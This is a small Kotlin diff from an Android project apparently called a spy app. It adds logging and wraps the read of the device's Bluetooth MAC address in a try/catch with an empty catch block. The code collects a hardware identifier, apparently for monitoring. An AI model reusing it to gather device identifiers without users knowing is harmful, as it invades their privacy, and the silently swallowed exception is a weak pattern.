@@ -1,16 +1,15 @@
 package com.komnacki.androidspyapp.device.bluetooth
 
 import android.content.Context
+import android.util.Log
 import com.komnacki.androidspyapp.Message
-import github.nisrulz.easydeviceinfo.base.BatteryHealth
-import github.nisrulz.easydeviceinfo.base.ChargingVia
-import github.nisrulz.easydeviceinfo.base.EasyBatteryMod
 import github.nisrulz.easydeviceinfo.base.EasyBluetoothMod
 
 
 class BluetoothState(override var context: Context) :
     Message {
     init {
+        Log.d("KK: ", "BluetoothState")
         getBluetoothState(
             context
         )
@@ -21,7 +20,11 @@ class BluetoothState(override var context: Context) :
 
         fun getBluetoothState(context: Context) {
             val easyBluetoothState = EasyBluetoothMod(context)
-            info["MAC"] = easyBluetoothState.bluetoothMAC
+            try {
+                info["MAC"] = easyBluetoothState.bluetoothMAC
+            } catch (e : Exception) {
+
+            }
         }
     }
 
